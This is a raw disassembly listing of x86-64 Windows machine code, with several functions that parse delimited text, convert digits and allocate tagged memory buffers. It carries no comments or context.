   14000413a:	eb 16                	jmp    0x140004152
   14000413c:	3c 7d                	cmp    $0x7d,%al
   14000413e:	74 18                	je     0x140004158
   140004140:	47 8d 34 b6          	lea    (%r14,%r14,4),%r14d
   140004144:	0f be c0             	movsbl %al,%eax
   140004147:	45 8d 76 e8          	lea    -0x18(%r14),%r14d
   14000414b:	48 03 fe             	add    %rsi,%rdi
   14000414e:	46 8d 34 70          	lea    (%rax,%r14,2),%r14d
   140004152:	8a 07                	mov    (%rdi),%al
   140004154:	3c 7c                	cmp    $0x7c,%al
   140004156:	75 e4                	jne    0x14000413c
   140004158:	45 85 ff             	test   %r15d,%r15d
   14000415b:	74 2b                	je     0x140004188
   14000415d:	33 d2                	xor    %edx,%edx
   14000415f:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140004163:	44 8d 42 20          	lea    0x20(%rdx),%r8d
   140004167:	e8 14 33 00 00       	call   0x140007480
   14000416c:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140004170:	44 89 7d ec          	mov    %r15d,-0x14(%rbp)
   140004174:	48 8d 0d 8d b7 00 00 	lea    0xb78d(%rip),%rcx        # 0x14000f908
   14000417b:	44 89 75 e8          	mov    %r14d,-0x18(%rbp)
   14000417f:	44 89 65 f0          	mov    %r12d,-0x10(%rbp)
   140004183:	e8 7c f9 ff ff       	call   0x140003b04
   140004188:	80 3f 7d             	cmpb   $0x7d,(%rdi)
   14000418b:	74 0b                	je     0x140004198
   14000418d:	48 03 fe             	add    %rsi,%rdi
   140004190:	38 1d c2 76 00 00    	cmp    %bl,0x76c2(%rip)        # 0x14000b858
   140004196:	74 9f                	je     0x140004137
   140004198:	48 03 fe             	add    %rsi,%rdi
   14000419b:	8a 07                	mov    (%rdi),%al
   14000419d:	84 c0                	test   %al,%al
   14000419f:	0f 85 2e ff ff ff    	jne    0x1400040d3
   1400041a5:	8a 05 ad 76 00 00    	mov    0x76ad(%rip),%al        # 0x14000b858
   1400041ab:	84 c0                	test   %al,%al
   1400041ad:	0f 94 05 20 9b 00 00 	sete   0x9b20(%rip)        # 0x14000dcd4
   1400041b4:	84 c0                	test   %al,%al
   1400041b6:	75 06                	jne    0x1400041be
   1400041b8:	87 35 c2 76 00 00    	xchg   %esi,0x76c2(%rip)        # 0x14000b880
   1400041be:	38 1d 94 76 00 00    	cmp    %bl,0x7694(%rip)        # 0x14000b858
   1400041c4:	0f 94 c3             	sete   %bl
   1400041c7:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400041cb:	e8 78 2c 00 00       	call   0x140006e48
   1400041d0:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   1400041d5:	8a c3                	mov    %bl,%al
   1400041d7:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400041db:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400041df:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   1400041e3:	4d 8b 63 38          	mov    0x38(%r11),%r12
   1400041e7:	49 8b e3             	mov    %r11,%rsp
   1400041ea:	41 5f                	pop    %r15
   1400041ec:	41 5e                	pop    %r14
   1400041ee:	5d                   	pop    %rbp
   1400041ef:	c3                   	ret
   1400041f0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400041f5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400041fa:	55                   	push   %rbp
   1400041fb:	57                   	push   %rdi
   1400041fc:	41 56                	push   %r14
   1400041fe:	48 8d 6c 24 b0       	lea    -0x50(%rsp),%rbp
   140004203:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   14000420a:	48 8b 05 9f 75 00 00 	mov    0x759f(%rip),%rax        # 0x14000b7b0
   140004211:	48 33 c4             	xor    %rsp,%rax
   140004214:	48 89 45 40          	mov    %rax,0x40(%rbp)
   140004218:	48 8b d9             	mov    %rcx,%rbx
   14000421b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000421e:	33 c0                	xor    %eax,%eax
   140004220:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004225:	33 d2                	xor    %edx,%edx
   140004227:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000422c:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140004232:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   140004237:	e8 44 32 00 00       	call   0x140007480
   14000423c:	33 ff                	xor    %edi,%edi
   14000423e:	48 39 3d bb b6 00 00 	cmp    %rdi,0xb6bb(%rip)        # 0x14000f900
   140004245:	0f 84 55 01 00 00    	je     0x1400043a0
   14000424b:	40 38 3d ce b6 00 00 	cmp    %dil,0xb6ce(%rip)        # 0x14000f920
   140004252:	4c 8d 35 c7 b6 00 00 	lea    0xb6c7(%rip),%r14        # 0x14000f920
   140004259:	74 13                	je     0x14000426e
   14000425b:	49 8b d6             	mov    %r14,%rdx
   14000425e:	48 8b cb             	mov    %rbx,%rcx
   140004261:	e8 ee 2d 00 00       	call   0x140007054
   140004266:	85 c0                	test   %eax,%eax
   140004268:	0f 84 32 01 00 00    	je     0x1400043a0
   14000426e:	48 8b d3             	mov    %rbx,%rdx
   140004271:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004276:	e8 2d 06 00 00       	call   0x1400048a8
   14000427b:	84 c0                	test   %al,%al
   14000427d:	0f 85 23 01 00 00    	jne    0x1400043a6
   140004283:	40 38 7c 24 40       	cmp    %dil,0x40(%rsp)
   140004288:	0f 84 18 01 00 00    	je     0x1400043a6
   14000428e:	ba 00 28 00 00       	mov    $0x2800,%edx
   140004293:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004298:	e8 db 2b 00 00       	call   0x140006e78
   14000429d:	84 c0                	test   %al,%al
   14000429f:	0f 84 01 01 00 00    	je     0x1400043a6
   1400042a5:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400042aa:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400042af:	e8 d4 1c 00 00       	call   0x140005f88
   1400042b4:	84 c0                	test   %al,%al
   1400042b6:	0f 84 ea 00 00 00    	je     0x1400043a6
   1400042bc:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400042c1:	e8 1e d8 ff ff       	call   0x140001ae4
   1400042c6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400042cb:	48 8b f0             	mov    %rax,%rsi
   1400042ce:	e8 45 2c 00 00       	call   0x140006f18
   1400042d3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400042d8:	48 8b d8             	mov    %rax,%rbx
   1400042db:	e8 38 2b 00 00       	call   0x140006e18
   1400042e0:	48 83 fb 1e          	cmp    $0x1e,%rbx
   1400042e4:	0f 86 bc 00 00 00    	jbe    0x1400043a6
   1400042ea:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   1400042f0:	48 8b d6             	mov    %rsi,%rdx
   1400042f3:	48 8b c8             	mov    %rax,%rcx
   1400042f6:	e8 21 11 00 00       	call   0x14000541c
   1400042fb:	48 85 c0             	test   %rax,%rax
   1400042fe:	0f 84 a2 00 00 00    	je     0x1400043a6
   140004304:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004309:	e8 0a 2c 00 00       	call   0x140006f18
   14000430e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004313:	48 8b d8             	mov    %rax,%rbx
   140004316:	e8 fd 2a 00 00       	call   0x140006e18
   14000431b:	48 8b c8             	mov    %rax,%rcx
   14000431e:	48 8b d3             	mov    %rbx,%rdx
   140004321:	e8 1e 1c 00 00       	call   0x140005f44
   140004326:	48 8b f0             	mov    %rax,%rsi
   140004329:	48 85 c0             	test   %rax,%rax
   14000432c:	74 78                	je     0x1400043a6
   14000432e:	33 d2                	xor    %edx,%edx
   140004330:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   140004336:	49 8b ce             	mov    %r14,%rcx
   140004339:	e8 42 31 00 00       	call   0x140007480
   14000433e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004343:	e8 d0 2b 00 00       	call   0x140006f18
   140004348:	48 8b d8             	mov    %rax,%rbx
   14000434b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004350:	2b de                	sub    %esi,%ebx
   140004352:	e8 c1 2a 00 00       	call   0x140006e18
   140004357:	4d 8b c6             	mov    %r14,%r8
   14000435a:	48 8b ce             	mov    %rsi,%rcx
   14000435d:	8d 14 03             	lea    (%rbx,%rax,1),%edx
   140004360:	e8 b7 e3 ff ff       	call   0x14000271c
   140004365:	49 8b d6             	mov    %r14,%rdx
   140004368:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000436d:	e8 36 05 00 00       	call   0x1400048a8
   140004372:	41 b6 01             	mov    $0x1,%r14b
   140004375:	41 3a c6             	cmp    %r14b,%al
   140004378:	75 2c                	jne    0x1400043a6
   14000437a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000437f:	e8 94 2b 00 00       	call   0x140006f18
   140004384:	48 8b d8             	mov    %rax,%rbx
   140004387:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000438c:	2b de                	sub    %esi,%ebx
   14000438e:	e8 85 2a 00 00       	call   0x140006e18
   140004393:	48 8b ce             	mov    %rsi,%rcx
   140004396:	8d 14 03             	lea    (%rbx,%rax,1),%edx
   140004399:	e8 9a fb ff ff       	call   0x140003f38
   14000439e:	eb 03                	jmp    0x1400043a3
   1400043a0:	44 8a f7             	mov    %dil,%r14b
   1400043a3:	41 8a fe             	mov    %r14b,%dil
   1400043a6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400043ab:	e8 98 2a 00 00       	call   0x140006e48
   1400043b0:	40 8a c7             	mov    %dil,%al
   1400043b3:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   1400043b7:	48 33 cc             	xor    %rsp,%rcx
   1400043ba:	e8 f1 2c 00 00       	call   0x1400070b0
   1400043bf:	4c 8d 9c 24 50 01 00 	lea    0x150(%rsp),%r11
   1400043c6:	00 
   1400043c7:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   1400043cb:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1400043cf:	49 8b e3             	mov    %r11,%rsp
   1400043d2:	41 5e                	pop    %r14
   1400043d4:	5f                   	pop    %rdi
   1400043d5:	5d                   	pop    %rbp
   1400043d6:	c3                   	ret
   1400043d7:	cc                   	int3
   1400043d8:	48 8b c4             	mov    %rsp,%rax
   1400043db:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400043df:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400043e3:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400043e7:	4c 89 60 20          	mov    %r12,0x20(%rax)
   1400043eb:	41 57                	push   %r15
   1400043ed:	48 83 ec 30          	sub    $0x30,%rsp
   1400043f1:	83 60 ec 00          	andl   $0x0,-0x14(%rax)
   1400043f5:	33 f6                	xor    %esi,%esi
   1400043f7:	48 8b 05 c2 98 00 00 	mov    0x98c2(%rip),%rax        # 0x14000dcc0
   1400043fe:	41 bf 00 00 02 00    	mov    $0x20000,%r15d
   140004404:	48 85 c0             	test   %rax,%rax
   140004407:	75 22                	jne    0x14000442b
   140004409:	41 b8 51 61 78 58    	mov    $0x58786151,%r8d
   14000440f:	8d 4e 01             	lea    0x1(%rsi),%ecx
   140004412:	41 8b d7             	mov    %r15d,%edx
   140004415:	ff 15 ed 3e 00 00    	call   *0x3eed(%rip)        # 0x140008308
   14000441b:	48 89 05 9e 98 00 00 	mov    %rax,0x989e(%rip)        # 0x14000dcc0
   140004422:	48 85 c0             	test   %rax,%rax
   140004425:	0f 84 57 02 00 00    	je     0x140004682
   14000442b:	40 38 35 ae 9c 00 00 	cmp    %sil,0x9cae(%rip)        # 0x14000e0e0
   140004432:	0f 85 4a 02 00 00    	jne    0x140004682
   140004438:	48 39 35 89 98 00 00 	cmp    %rsi,0x9889(%rip)        # 0x14000dcc8
   14000443f:	0f 85 3d 02 00 00    	jne    0x140004682
   140004445:	48 39 35 8c 98 00 00 	cmp    %rsi,0x988c(%rip)        # 0x14000dcd8
   14000444c:	0f 85 30 02 00 00    	jne    0x140004682
   140004452:	40 38 35 a7 b0 00 00 	cmp    %sil,0xb0a7(%rip)        # 0x14000f500
   140004459:	0f 84 23 02 00 00    	je     0x140004682
   14000445f:	48 8b f8             	mov    %rax,%rdi
   140004462:	4c 8d 25 77 9c 00 00 	lea    0x9c77(%rip),%r12        # 0x14000e0e0
   140004469:	33 c0                	xor    %eax,%eax
   14000446b:	49 8b cf             	mov    %r15,%rcx
   14000446e:	f3 aa                	rep stos %al,(%rdi)
   140004470:	48 8b 15 49 98 00 00 	mov    0x9849(%rip),%rdx        # 0x14000dcc0
   140004477:	49 8b fc             	mov    %r12,%rdi
   14000447a:	b9 00 02 00 00       	mov    $0x200,%ecx
   14000447f:	4d 8b c7             	mov    %r15,%r8
   140004482:	f3 aa                	rep stos %al,(%rdi)
   140004484:	48 8d 0d 75 b0 00 00 	lea    0xb075(%rip),%rcx        # 0x14000f500
   14000448b:	e8 78 1d 00 00       	call   0x140006208
   140004490:	84 c0                	test   %al,%al
   140004492:	0f 84 ea 01 00 00    	je     0x140004682
   140004498:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000449d:	e8 42 d6 ff ff       	call   0x140001ae4
   1400044a2:	48 8b 0d 17 98 00 00 	mov    0x9817(%rip),%rcx        # 0x14000dcc0
   1400044a9:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   1400044af:	48 8b d0             	mov    %rax,%rdx
   1400044b2:	e8 65 0f 00 00       	call   0x14000541c
   1400044b7:	48 85 c0             	test   %rax,%rax
   1400044ba:	0f 84 c2 01 00 00    	je     0x140004682
   1400044c0:	48 8b 0d f9 97 00 00 	mov    0x97f9(%rip),%rcx        # 0x14000dcc0
   1400044c7:	49 8b d7             	mov    %r15,%rdx
   1400044ca:	e8 75 1a 00 00       	call   0x140005f44
   1400044cf:	48 85 c0             	test   %rax,%rax
   1400044d2:	0f 84 aa 01 00 00    	je     0x140004682
   1400044d8:	45 8b c7             	mov    %r15d,%r8d
   1400044db:	48 8d 15 6e 31 00 00 	lea    0x316e(%rip),%rdx        # 0x140007650
   1400044e2:	48 8b c8             	mov    %rax,%rcx
   1400044e5:	e8 32 0f 00 00       	call   0x14000541c
   1400044ea:	48 8b c8             	mov    %rax,%rcx
   1400044ed:	48 8d 15 6c 31 00 00 	lea    0x316c(%rip),%rdx        # 0x140007660
   1400044f4:	48 ff c0             	inc    %rax
   1400044f7:	45 8b c7             	mov    %r15d,%r8d
   1400044fa:	48 89 05 d7 97 00 00 	mov    %rax,0x97d7(%rip)        # 0x14000dcd8
   140004501:	e8 16 0f 00 00       	call   0x14000541c
   140004506:	45 8b c7             	mov    %r15d,%r8d
   140004509:	48 8d 15 60 31 00 00 	lea    0x3160(%rip),%rdx        # 0x140007670
   140004510:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140004514:	40 88 30             	mov    %sil,(%rax)
   140004517:	e8 00 0f 00 00       	call   0x14000541c
   14000451c:	b9 05 00 00 00       	mov    $0x5,%ecx
   140004521:	48 8b f8             	mov    %rax,%rdi
   140004524:	e8 bb d5 ff ff       	call   0x140001ae4
   140004529:	48 8b d0             	mov    %rax,%rdx
   14000452c:	49 8b cc             	mov    %r12,%rcx
   14000452f:	e8 5c 2a 00 00       	call   0x140006f90
   140004534:	48 8b 15 9d 97 00 00 	mov    0x979d(%rip),%rdx        # 0x14000dcd8
   14000453b:	49 8b cc             	mov    %r12,%rcx
   14000453e:	e8 0b 2b 00 00       	call   0x14000704e
   140004543:	49 8b cc             	mov    %r12,%rcx
   140004546:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   14000454b:	e8 da 2a 00 00       	call   0x14000702a
   140004550:	49 8b cc             	mov    %r12,%rcx
   140004553:	66 89 44 24 22       	mov    %ax,0x22(%rsp)
   140004558:	e8 cd 2a 00 00       	call   0x14000702a
   14000455d:	48 8d 15 7c 9d 00 00 	lea    0x9d7c(%rip),%rdx        # 0x14000e2e0
   140004564:	66 89 44 24 20       	mov    %ax,0x20(%rsp)
   140004569:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000456e:	e8 89 05 00 00       	call   0x140004afc
   140004573:	48 8b 0d 5e 97 00 00 	mov    0x975e(%rip),%rcx        # 0x14000dcd8
   14000457a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000457f:	e8 a6 2a 00 00       	call   0x14000702a
   140004584:	48 8b 0d 4d 97 00 00 	mov    0x974d(%rip),%rcx        # 0x14000dcd8
   14000458b:	66 89 44 24 22       	mov    %ax,0x22(%rsp)
   140004590:	e8 95 2a 00 00       	call   0x14000702a
   140004595:	48 8d 15 44 97 00 00 	lea    0x9744(%rip),%rdx        # 0x14000dce0
   14000459c:	66 89 44 24 20       	mov    %ax,0x20(%rsp)
   1400045a1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400045a6:	e8 51 05 00 00       	call   0x140004afc
   1400045ab:	48 8d 47 01          	lea    0x1(%rdi),%rax
   1400045af:	48 89 05 12 97 00 00 	mov    %rax,0x9712(%rip)        # 0x14000dcc8
   1400045b6:	eb 11                	jmp    0x1400045c9
   1400045b8:	84 c0                	test   %al,%al
   1400045ba:	74 13                	je     0x1400045cf
   1400045bc:	3c 2c                	cmp    $0x2c,%al
   1400045be:	75 06                	jne    0x1400045c6
   1400045c0:	ff 05 0a 97 00 00    	incl   0x970a(%rip)        # 0x14000dcd0
   1400045c6:	48 ff c7             	inc    %rdi
   1400045c9:	8a 07                	mov    (%rdi),%al
   1400045cb:	3c 7d                	cmp    $0x7d,%al
   1400045cd:	75 e9                	jne    0x1400045b8
   1400045cf:	8b 05 fb 96 00 00    	mov    0x96fb(%rip),%eax        # 0x14000dcd0
   1400045d5:	85 c0                	test   %eax,%eax
   1400045d7:	74 08                	je     0x1400045e1
   1400045d9:	ff c0                	inc    %eax
   1400045db:	89 05 ef 96 00 00    	mov    %eax,0x96ef(%rip)        # 0x14000dcd0
   1400045e1:	48 8b 1d e0 96 00 00 	mov    0x96e0(%rip),%rbx        # 0x14000dcc8
   1400045e8:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400045ed:	8b d0                	mov    %eax,%edx
   1400045ef:	41 b8 51 61 78 58    	mov    $0x58786151,%r8d
   1400045f5:	ff 15 0d 3d 00 00    	call   *0x3d0d(%rip)        # 0x140008308
   1400045fb:	48 89 05 c6 96 00 00 	mov    %rax,0x96c6(%rip)        # 0x14000dcc8
   140004602:	48 85 c0             	test   %rax,%rax
   140004605:	75 1d                	jne    0x140004624
   140004607:	48 8b 3d b2 96 00 00 	mov    0x96b2(%rip),%rdi        # 0x14000dcc0
   14000460e:	49 8b cf             	mov    %r15,%rcx
   140004611:	48 21 35 c0 96 00 00 	and    %rsi,0x96c0(%rip)        # 0x14000dcd8
   140004618:	f3 aa                	rep stos %al,(%rdi)
   14000461a:	49 8b fc             	mov    %r12,%rdi
   14000461d:	8d 48 08             	lea    0x8(%rax),%ecx
   140004620:	f3 aa                	rep stos %al,(%rdi)
   140004622:	eb 60                	jmp    0x140004684
   140004624:	8b 0d a6 96 00 00    	mov    0x96a6(%rip),%ecx        # 0x14000dcd0
   14000462a:	48 8b f8             	mov    %rax,%rdi
   14000462d:	33 c0                	xor    %eax,%eax
   14000462f:	f3 aa                	rep stos %al,(%rdi)
   140004631:	40 8a 3b             	mov    (%rbx),%dil
   140004634:	40 80 ff 7d          	cmp    $0x7d,%dil
   140004638:	74 44                	je     0x14000467e
   14000463a:	45 33 c0             	xor    %r8d,%r8d
   14000463d:	40 84 ff             	test   %dil,%dil
   140004640:	74 3c                	je     0x14000467e
   140004642:	41 3b f7             	cmp    %r15d,%esi
   140004645:	73 37                	jae    0x14000467e
   140004647:	40 80 ff 2c          	cmp    $0x2c,%dil
   14000464b:	74 20                	je     0x14000466d
   14000464d:	48 8b 15 74 96 00 00 	mov    0x9674(%rip),%rdx        # 0x14000dcc8
   140004654:	41 8a 0c 10          	mov    (%r8,%rdx,1),%cl
   140004658:	8a c1                	mov    %cl,%al
   14000465a:	c0 e0 02             	shl    $0x2,%al
   14000465d:	02 c8                	add    %al,%cl
   14000465f:	02 c9                	add    %cl,%cl
   140004661:	80 e9 30             	sub    $0x30,%cl
   140004664:	40 02 cf             	add    %dil,%cl
   140004667:	41 88 0c 10          	mov    %cl,(%r8,%rdx,1)
   14000466b:	eb 05                	jmp    0x140004672
   14000466d:	ff c6                	inc    %esi
   14000466f:	49 ff c0             	inc    %r8
   140004672:	48 ff c3             	inc    %rbx
   140004675:	40 8a 3b             	mov    (%rbx),%dil
   140004678:	40 80 ff 7d          	cmp    $0x7d,%dil
   14000467c:	75 bf                	jne    0x14000463d
   14000467e:	b0 01                	mov    $0x1,%al
   140004680:	eb 02                	jmp    0x140004684
   140004682:	32 c0                	xor    %al,%al
   140004684:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004689:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000468e:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140004693:	4c 8b 64 24 58       	mov    0x58(%rsp),%r12
   140004698:	48 83 c4 30          	add    $0x30,%rsp
   14000469c:	41 5f                	pop    %r15
   14000469e:	c3                   	ret
   14000469f:	cc                   	int3
   1400046a0:	48 89 6c 24 08       	mov    %rbp,0x8(%rsp)
   1400046a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400046aa:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400046af:	41 56                	push   %r14
   1400046b1:	48 83 ec 20          	sub    $0x20,%rsp
   1400046b5:	48 83 3d 43 b2 00 00 	cmpq   $0x0,0xb243(%rip)        # 0x14000f900
   1400046bc:	00 
   1400046bd:	0f 84 b9 00 00 00    	je     0x14000477c
   1400046c3:	33 c0                	xor    %eax,%eax
   1400046c5:	48 8d 3d 14 a0 00 00 	lea    0xa014(%rip),%rdi        # 0x14000e6e0
   1400046cc:	be 00 08 00 00       	mov    $0x800,%esi
   1400046d1:	4c 8d 35 28 a8 00 00 	lea    0xa828(%rip),%r14        # 0x14000ef00
   1400046d8:	8b ce                	mov    %esi,%ecx
   1400046da:	49 8b d6             	mov    %r14,%rdx
   1400046dd:	f3 aa                	rep stos %al,(%rdi)
   1400046df:	44 8d 40 05          	lea    0x5(%rax),%r8d
   1400046e3:	bd 00 02 00 00       	mov    $0x200,%ebp
   1400046e8:	48 8b fa             	mov    %rdx,%rdi
   1400046eb:	33 c0                	xor    %eax,%eax
   1400046ed:	48 03 d5             	add    %rbp,%rdx
   1400046f0:	48 8b cd             	mov    %rbp,%rcx
   1400046f3:	f3 aa                	rep stos %al,(%rdi)
   1400046f5:	49 83 e8 01          	sub    $0x1,%r8
   1400046f9:	75 ed                	jne    0x1400046e8
   1400046fb:	48 8b 0d fe b1 00 00 	mov    0xb1fe(%rip),%rcx        # 0x14000f900
   140004702:	48 8d 15 d7 9f 00 00 	lea    0x9fd7(%rip),%rdx        # 0x14000e6e0
   140004709:	4c 8b c6             	mov    %rsi,%r8
   14000470c:	e8 f7 1a 00 00       	call   0x140006208
   140004711:	84 c0                	test   %al,%al
   140004713:	74 67                	je     0x14000477c
   140004715:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000471a:	e8 c5 d3 ff ff       	call   0x140001ae4
   14000471f:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   140004725:	48 8d 0d b4 9f 00 00 	lea    0x9fb4(%rip),%rcx        # 0x14000e6e0
   14000472c:	48 8b d0             	mov    %rax,%rdx
   14000472f:	e8 e8 0c 00 00       	call   0x14000541c
   140004734:	48 85 c0             	test   %rax,%rax
   140004737:	74 43                	je     0x14000477c
   140004739:	48 8b d6             	mov    %rsi,%rdx
   14000473c:	48 8d 0d 9d 9f 00 00 	lea    0x9f9d(%rip),%rcx        # 0x14000e6e0
   140004743:	e8 fc 17 00 00       	call   0x140005f44
   140004748:	48 85 c0             	test   %rax,%rax
   14000474b:	74 2f                	je     0x14000477c
   14000474d:	8a 10                	mov    (%rax),%dl
   14000474f:	84 d2                	test   %dl,%dl
   140004751:	74 25                	je     0x140004778
   140004753:	33 ff                	xor    %edi,%edi
   140004755:	45 33 c0             	xor    %r8d,%r8d
   140004758:	80 fa 7c             	cmp    $0x7c,%dl
   14000475b:	75 07                	jne    0x140004764
   14000475d:	4c 03 c5             	add    %rbp,%r8
   140004760:	33 ff                	xor    %edi,%edi
   140004762:	eb 0b                	jmp    0x14000476f
   140004764:	49 8d 0c 38          	lea    (%r8,%rdi,1),%rcx
   140004768:	48 ff c7             	inc    %rdi
   14000476b:	42 88 14 31          	mov    %dl,(%rcx,%r14,1)
   14000476f:	48 ff c0             	inc    %rax
   140004772:	8a 10                	mov    (%rax),%dl
   140004774:	84 d2                	test   %dl,%dl
   140004776:	75 e0                	jne    0x140004758
   140004778:	b0 01                	mov    $0x1,%al
   14000477a:	eb 02                	jmp    0x14000477e
   14000477c:	32 c0                	xor    %al,%al
   14000477e:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140004783:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004788:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   14000478d:	48 83 c4 20          	add    $0x20,%rsp
   140004791:	41 5e                	pop    %r14
   140004793:	c3                   	ret
   140004794:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004799:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000479e:	57                   	push   %rdi
   14000479f:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   1400047a6:	48 8b 05 03 70 00 00 	mov    0x7003(%rip),%rax        # 0x14000b7b0
   1400047ad:	48 33 c4             	xor    %rsp,%rax
   1400047b0:	48 89 84 24 20 01 00 	mov    %rax,0x120(%rsp)
   1400047b7:	00 
   1400047b8:	33 d2                	xor    %edx,%edx
   1400047ba:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400047bf:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   1400047c5:	e8 b6 2c 00 00       	call   0x140007480
   1400047ca:	48 83 3d 2e b1 00 00 	cmpq   $0x0,0xb12e(%rip)        # 0x14000f900
   1400047d1:	00 
   1400047d2:	0f 84 a8 00 00 00    	je     0x140004880
   1400047d8:	80 3d 21 ab 00 00 00 	cmpb   $0x0,0xab21(%rip)        # 0x14000f300
   1400047df:	0f 84 9b 00 00 00    	je     0x140004880
   1400047e5:	4c 8d 0d f4 a6 00 00 	lea    0xa6f4(%rip),%r9        # 0x14000eee0
   1400047ec:	4c 8d 05 0d ab 00 00 	lea    0xab0d(%rip),%r8        # 0x14000f300
   1400047f3:	48 8d 15 26 2e 00 00 	lea    0x2e26(%rip),%rdx        # 0x140007620
   1400047fa:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400047ff:	e8 20 28 00 00       	call   0x140007024
   140004804:	48 8d 35 d5 9e 00 00 	lea    0x9ed5(%rip),%rsi        # 0x14000e6e0
   14000480b:	bb 00 08 00 00       	mov    $0x800,%ebx
   140004810:	33 c0                	xor    %eax,%eax
   140004812:	48 8b fe             	mov    %rsi,%rdi
   140004815:	8b cb                	mov    %ebx,%ecx
   140004817:	44 8b c3             	mov    %ebx,%r8d
   14000481a:	f3 aa                	rep stos %al,(%rdi)
   14000481c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004821:	48 8b d6             	mov    %rsi,%rdx
   140004824:	e8 df 19 00 00       	call   0x140006208
   140004829:	84 c0                	test   %al,%al
   14000482b:	74 53                	je     0x140004880
   14000482d:	b9 03 00 00 00       	mov    $0x3,%ecx
   140004832:	e8 ad d2 ff ff       	call   0x140001ae4
   140004837:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   14000483d:	48 8b d0             	mov    %rax,%rdx
   140004840:	48 8b ce             	mov    %rsi,%rcx
   140004843:	e8 d4 0b 00 00       	call   0x14000541c
   140004848:	48 85 c0             	test   %rax,%rax
   14000484b:	74 33                	je     0x140004880
   14000484d:	8b d3                	mov    %ebx,%edx
   14000484f:	48 8b ce             	mov    %rsi,%rcx
   140004852:	e8 ed 16 00 00       	call   0x140005f44
   140004857:	48 85 c0             	test   %rax,%rax
   14000485a:	74 24                	je     0x140004880
   14000485c:	44 8b c3             	mov    %ebx,%r8d
   14000485f:	48 8d 15 ca 2d 00 00 	lea    0x2dca(%rip),%rdx        # 0x140007630
   140004866:	48 8b c8             	mov    %rax,%rcx
   140004869:	e8 ae 0b 00 00       	call   0x14000541c
   14000486e:	48 85 c0             	test   %rax,%rax
   140004871:	74 0d                	je     0x140004880
   140004873:	33 c0                	xor    %eax,%eax
   140004875:	48 8b fe             	mov    %rsi,%rdi
   140004878:	8b cb                	mov    %ebx,%ecx
   14000487a:	f3 aa                	rep stos %al,(%rdi)
   14000487c:	b0 01                	mov    $0x1,%al
   14000487e:	eb 02                	jmp    0x140004882
   140004880:	32 c0                	xor    %al,%al
   140004882:	48 8b 8c 24 20 01 00 	mov    0x120(%rsp),%rcx
   140004889:	00 
   14000488a:	48 33 cc             	xor    %rsp,%rcx
   14000488d:	e8 1e 28 00 00       	call   0x1400070b0
   140004892:	4c 8d 9c 24 30 01 00 	lea    0x130(%rsp),%r11
   140004899:	00 
   14000489a:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000489e:	49 8b 73 18          	mov    0x18(%r11),%rsi
   1400048a2:	49 8b e3             	mov    %r11,%rsp
   1400048a5:	5f                   	pop    %rdi
   1400048a6:	c3                   	ret
   1400048a7:	cc                   	int3
